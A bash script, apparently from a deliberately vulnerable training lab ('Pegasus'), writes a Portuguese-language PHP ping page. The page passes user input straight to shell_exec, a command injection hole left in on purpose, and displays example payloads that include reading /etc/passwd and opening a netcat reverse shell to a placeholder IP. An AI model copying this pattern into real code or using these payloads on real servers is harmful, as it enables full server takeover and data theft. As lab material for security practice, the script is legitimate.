#!/bin/bash
# Componente para correção do search.php

create_search_php() {
    log_message "${BLUE}${MSG_INFO}" "Corrigindo search.php..."
    
    cat > "$APP_DIR/app/search.php" << 'PHP'
<?php
session_start();
$result = '';
$error = '';
$domain = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['domain'])) {
    $domain = trim($_POST['domain']);
    
    if (empty($domain)) {
        $error = "❌ Por favor, digite um domínio para testar";
    } else {
        $command = "ping -c 3 $domain 2>&1";
        error_log("[PEGASUS] Ping attempt: $domain from IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
        
        $result = shell_exec($command);
        
        if (empty($result)) {
            $error = "❌ Nenhum resultado retornado. Verifique o domínio.";
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Teste de Conectividade - Pegasus</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        .test-form { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .result-box { background: #f8f9fa; border: 1px solid #dee2e6; padding: 15px; border-radius: 8px; margin: 20px 0; }
        .vuln-info { background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; border-radius: 8px; margin-top: 20px; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0; }
        pre { white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; }
        .examples { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 8px; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔍 Sistema de Teste de Conectividade</h2>
        <p>Ferramenta para testar conectividade com domínios externos usando ping.</p>
        
        <?php if($error): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>
        
        <div class="test-form">
            <h3>🌐 Testar Domínio</h3>
            <form method="post">
                <div style="margin-bottom: 15px;">
                    <input name="domain" 
                           placeholder="Digite um domínio (ex: google.com, github.com)" 
                           style="width: 70%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;" 
                           value="<?= htmlspecialchars($domain) ?>"
                           required>
                    <button type="submit" 
                            style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; margin-left: 10px;">
                        🔍 Testar Ping
                    </button>
                </div>
            </form>
        </div>
        
        <?php if($result && !$error): ?>
        <div class="result-box">
            <h3>📊 Resultado do Teste</h3>
            <strong>Comando executado:</strong> <code>ping -c 3 <?= htmlspecialchars($domain) ?></code><br><br>
            <pre><?= htmlspecialchars($result) ?></pre>
        </div>
        <?php endif; ?>
        
        <div class="examples">
            <h4>💡 Exemplos de Uso Legítimo</h4>
            <ul>
                <li><strong>google.com</strong> - Testar conectividade com Google</li>
                <li><strong>github.com</strong> - Testar conectividade com GitHub</li>
                <li><strong>stackoverflow.com</strong> - Testar conectividade com Stack Overflow</li>
            </ul>
        </div>
        
        <div class="vuln-info">
            <strong>🎯 VULNERABILIDADE: Command Injection</strong><br>
            <strong>Risco:</strong> Execução de comandos arbitrários no servidor<br>
            <strong>Impacto:</strong> Controle total do sistema, acesso a dados sensíveis<br>
            <strong>Testes de Penetração:</strong><br>
            • <code>google.com; whoami</code> - Descobrir usuário atual<br>
            • <code>google.com && ls -la</code> - Listar arquivos do diretório<br>
            • <code>google.com; cat /etc/passwd</code> - Ler arquivo de usuários<br>
            • <code>google.com | nc -e /bin/bash [IP] [PORTA]</code> - Reverse shell<br>
            <strong>CVSS Score:</strong> 9.8 (Critical)
        </div>
        
        <p style="margin-top: 30px;"><a href="index.php" style="text-decoration: none; color: #007bff;">← Voltar ao Portal</a></p>
    </div>
</body>
</html>
PHP
    
    log_message "${GREEN}${MSG_SUCCESS}" "search.php corrigido"
}